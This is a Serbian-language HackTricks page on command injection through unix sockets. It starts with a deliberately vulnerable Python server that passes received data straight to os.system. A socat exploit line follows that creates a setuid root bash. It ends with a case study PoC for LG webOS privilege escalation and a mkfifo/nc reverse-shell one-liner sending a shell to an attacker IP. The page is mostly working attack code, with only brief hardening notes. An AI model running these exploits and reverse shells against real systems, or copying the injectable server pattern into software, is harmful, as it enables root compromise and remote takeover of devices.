# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Primer vezivanja socket-a pomoću Python-a

U sledećem primeru se kreira **unix socket** (`/tmp/socket_test.s`) i sve što je **primljeno** biće **izvršeno** pomoću `os.system`. Znam da ovako nešto nećete pronaći u praksi, ali cilj ovog primera je da vidite kako izgleda kod koji koristi unix socket-e i kako se obrađuje unos u najgorem mogućem slučaju.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Izvršite** kod koristeći python: `python s.py` i **proverite kako socket osluškuje**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Studija slučaja: eskalacija pokrenuta signalom preko UNIX socket-a u vlasništvu root-a (LG webOS)

Neki privilegovani daemoni izlažu UNIX socket u vlasništvu root-a koji prihvata nepouzdane podatke i povezuje privilegovane radnje sa ID-ovima thread-ova i signalima. Ako protokol omogućava neprivilegovanom klijentu da utiče na to koji native thread je ciljan, možda ćete moći da pokrenete privilegovanu putanju koda i izvršite eskalaciju.<sup>[[1]](#references)</sup>

Uočeni obrazac:
- Povežite se na socket u vlasništvu root-a (npr. /tmp/remotelogger).
- Kreirajte thread i pribavite njegov native thread id (TID).
- Pošaljite TID (upakovan) zajedno sa padding-om kao zahtev; primite potvrdu.
- Pošaljite određeni signal tom TID-u da pokrenete privilegovano ponašanje.

Minimalni PoC prikaz:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Da bi se ovo pretvorilo u root shell, može se koristiti jednostavan named-pipe + nc obrazac:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Napomene:
- Ova klasa grešaka nastaje usled verovanja vrednostima izvedenim iz neprivilegovanog stanja klijenta (TID-ovima) i njihovog povezivanja sa privilegovanim rukovaocima signala ili logikom.
- Ojačajte sistem nametanjem provere akreditiva na socketu, validacijom formata poruka i odvajanjem privilegovanih operacija od eksterno dostavljenih identifikatora niti.

## References

- [1] [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
